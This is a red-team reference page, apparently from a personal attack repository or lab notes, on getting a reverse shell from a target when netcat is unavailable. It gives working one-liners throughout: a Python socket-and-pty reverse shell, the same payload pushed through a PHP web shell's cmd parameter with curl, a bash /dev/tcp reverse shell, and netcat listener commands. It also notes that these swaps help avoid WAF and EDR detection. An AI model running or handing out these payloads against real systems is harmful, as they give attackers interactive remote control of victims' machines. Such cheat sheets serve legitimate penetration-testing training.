---
title: FileUpload 4
parent: Attack Repository
grand_parent: Red Team
nav_order: 5
---
# If you can't use nc
# Overall Objective


An alternative method to establish a connection from the target to the attacker (192.168.49.57)
**to gain a shell (reverse shell)**.
# Why “When nc Cannot Be Used”

Common constraints:

* `nc` is not installed
* Functionality is limited in BusyBox
* The `-e` option is disabled (common recently)
* Easily detected by WAFs or EDRs

👉 Therefore,
**replace it with standard tools (Python / Bash)**

---

# Python 3 Version
```bash
python3 -c "import socket,os,pty;
s=socket.socket();
s.connect((‘192.168.49.57’,1234));
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)];
pty.spawn(‘/bin/sh’)"
```

### Processing Flow
1. `socket.socket()`
   → Create a TCP socket
2. `connect((‘192.168.49.57’,1234))`
   → Connects to the attacker's machine
3. `os.dup2()`
   → Redirects standard input/output to the socket
   * 0 = stdin
   * 1 = stdout
   * 2 = stderr
1. `pty.spawn(‘/bin/sh’)`
   → Shell with a pseudo-terminal (makes it easier to operate)

---

## URL Version (via Web Shell)

```bash
curl http://192.168.57.29:8089/.../simple-backdoor.php?cmd=python3 -c ‘...’
```

### Intent
* Inject a command into `simple-backdoor.php`
* Execute a Python reverse shell within it

👉 In other words
**RCE (Remote Code Execution) → Reverse Shell Escalation**

---

# Bash Version

```bash
bash -i >& /dev/tcp/192.168.49.57/443 0>&1
```

### Mechanism
* `/dev/tcp/host/port` → Bash’s pseudo-TCP functionality
* `>&` → Sends stdout/stderr
* `0>&1` → Also connects stdin

👉 Simple and requires no Python
👉 However, **limited to Bash versions where `/dev/tcp` is enabled**

---

# Practical Usage Comparison

| Method              | Requirements | Reliability |
| --------------- | --------- | --- |
| Python          | Python 3 required | High   |
| Bash (/dev/tcp) | Bash-compatible | Medium |
| nc              | Full functionality | High   |

---

# Notes (Attacker Preparation)

```bash
nc -lvnp 1234
```

Or
```bash
rlwrap nc -lvnp 1234
```

👉 This will not work without a recipient

---
